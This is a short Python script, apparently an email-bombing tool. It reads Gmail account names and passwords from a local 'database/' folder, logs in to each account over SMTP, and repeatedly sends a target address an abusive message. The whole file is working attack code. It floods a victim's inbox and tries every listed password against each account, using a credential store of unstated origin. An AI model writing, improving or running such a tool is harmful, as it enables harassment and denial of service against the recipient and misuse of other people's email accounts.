import smtplib
import sys
import os

email_text = "FUCKED UP BY HTECHNOLOGIES"
receivers = sys.argv[1]
threads = int(sys.argv[2])
to = receivers

for i in range(threads):
    for gmail in os.listdir('database/'):
        global password
        global sender
        with open("database/" + gmail, 'r', encoding='utf-8') as f:
            
            password = f.readlines()
            fstep = f'{gmail[:-4]}'
            sender = f"{fstep}@gmail.com"

            for gmail_password in password:
                finalpass = gmail_password
                gmail_user = sender
                sent_from = gmail_user
                try:
                    
                    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
                    server.ehlo()
                    server.login(gmail_user, finalpass)
                    server.sendmail(sent_from, to, email_text)
                    server.close()
                    print(f"[+] {gmail_user} -> {to}")
                except:
                    print(f"[-] {gmail_user} -> {to}")